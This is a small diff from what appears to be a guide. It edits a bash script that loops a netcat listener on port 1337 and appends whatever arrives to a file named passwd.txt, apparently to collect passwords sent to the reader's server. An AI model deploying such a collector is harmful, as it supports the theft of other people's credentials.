@@ -79,6 +79,6 @@ Use this bash script to listen on your server:
 #!/bin/bash
 while [ true ]
 do
-netcat -vv -lp 1337 &>> passwd.txt
+netcat -vlp 1337 &>> passwd.txt
 done
 ```
